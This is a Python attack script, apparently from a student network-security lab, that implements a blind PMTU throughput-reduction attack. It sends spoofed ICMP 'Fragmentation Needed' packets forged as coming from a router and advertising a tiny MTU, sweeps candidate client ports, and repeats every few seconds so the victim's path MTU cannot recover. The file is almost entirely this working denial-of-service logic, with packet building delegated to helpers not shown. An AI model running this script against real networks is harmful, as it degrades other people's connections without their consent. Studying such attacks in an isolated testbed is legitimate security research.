"""
pmtu_attack.py  —  ATTACK 2a: Blind Throughput-Reduction via PMTU (Phase 5).
Owner: DEBASHRI   (uses Anisa's common/ helpers)

Spoof ICMP "Fragmentation Needed" (Type 3, Code 4) with a tiny Next-Hop MTU,
source-spoofed as the Router. The Client's PMTU Discovery believes the path
shrank, drops its MSS, and throughput collapses. Unlike Attack 1 the flow
STAYS ALIVE — this is stealthier (report §5).

Unlike Attack 1, soft errors are NOT seq-gated, so this works on a STOCK
kernel (report §1). Repeat periodically to *sustain* the degradation.

Run inside the ATTACKER namespace:
    sudo ip netns exec attacker python3 -m attack2_throughput.pmtu_attack
"""

import time
from scapy.all import send
from common import config, packet_utils
from attack1_reset import infer_tuple      # reuse Anisa's port brute-force


def run(interval=2.0, rounds=30):
    print(f"[*] Attack 2a (PMTU) — forging MTU={config.SPOOFED_MTU}B, "
          f"resending every {interval}s")
    for r in range(rounds):
        # We still don't know the client port -> sweep it each round.
        # TODO(Debashri): once found (e.g. from Attack-1 phase or ss), pin the
        # port here so each round is one packet instead of a full sweep.
        for port in infer_tuple.candidate_ports():
            send(packet_utils.build_frag_needed(client_port=port), verbose=0)
        print(f"    round {r+1}/{rounds} sent")
        time.sleep(interval)      # keep re-poisoning so PMTU can't recover
    print("[+] Done. Compare throughput/MSS against baseline_result.txt.")


if __name__ == "__main__":
    run()
